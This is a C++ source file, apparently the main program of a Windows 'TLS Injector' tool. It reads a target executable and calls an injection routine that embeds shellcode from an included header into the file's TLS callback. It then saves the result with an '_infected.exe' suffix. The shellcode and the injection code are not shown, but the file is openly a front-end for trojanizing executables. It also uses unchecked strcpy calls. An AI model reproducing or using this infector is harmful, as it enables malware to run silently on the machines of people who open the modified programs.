#include <iostream>
#include <Windows.h>
#include "misc.h"
#include "shellcode.h"
#include "tlsInject.h"

int main(int argc, char** argv) {

	if (argc != 2) {
#ifdef _WIN64
		puts("usage: sake64.exe [path/to/file]");
#else
		puts("usage: sake32.exe [path/to/file]");
#endif
		puts("TLS Injector, powered by aaaddress1@chroot.org");
		return 0;
	}

	char pathToTarget[MAX_PATH] = { 0 };
	strcpy(pathToTarget, argv[1]);
	char* buff; size_t fileSize;
	if (!readBinFile(pathToTarget, &buff, fileSize)) {
		puts("[!] selected file not found.");
		return 0;
	}

	strcpy(strrchr(pathToTarget, '.'), "_infected.exe");
	printf(tlsInject(buff, shellcode, shellcodeLen, pathToTarget) ? "[+] file save as %s!\n[+] tls inject done.\n" : "[!] tls inject fail.", pathToTarget);
	return 0;
}
